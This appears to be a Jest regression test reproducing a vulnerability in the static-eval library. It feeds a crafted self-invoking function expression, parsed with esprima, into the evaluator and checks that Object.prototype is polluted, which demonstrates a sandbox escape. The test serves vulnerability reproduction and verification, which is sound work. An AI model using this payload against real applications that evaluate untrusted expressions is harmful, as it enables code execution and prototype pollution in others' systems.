test("Arbitrary code execution in static-eval", () => {
  expect.assertions(2);
  const evaluate = require("static-eval");
  const parse = require("esprima").parse;
  console.log(require.resolve('esprima'));
  expect({}.polluted).toBe(undefined);
  // let src = "Object.prototype.polluted = `yes`;";
  let src = "(function(){1 + (Object.prototype.polluted = `yes`)}())";
  // try {
    let ast = parse(src).body[0].expression;
    let res = evaluate(ast, {});
  // } catch (error) {}
  expect({}.polluted).toBe("yes");
});
